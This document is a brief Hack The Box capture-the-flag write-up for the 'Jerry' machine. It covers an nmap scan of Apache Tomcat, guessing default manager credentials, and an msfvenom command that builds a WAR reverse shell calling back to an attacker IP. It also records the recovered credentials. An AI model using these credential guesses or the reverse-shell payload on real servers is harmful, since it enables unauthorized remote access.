# Enumeration 

## open ports

```
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/7.0.88

```
### Port 8080
![[Pasted image 20230129043550.png]]
trying default tomcat creds

admin:admin
tomcat:tomcat
admin`:<NOTHING>`
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat

and tomcat:s3cr3t is valid
now we can upload .war file and get rev shell
`msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.5 LPORT=9001 -f war -o shell.war`
![[Pasted image 20230129045944.png]]
![[Pasted image 20230129050631.png]]
![[Pasted image 20230129050647.png]]

# Loot

tomcat manager creds:
	username: tomcat
	password: s3cr3t

---
Tags: #ctf #htb #tomcat 
Resources: [Jerry](https://app.hackthebox.com/machines/144)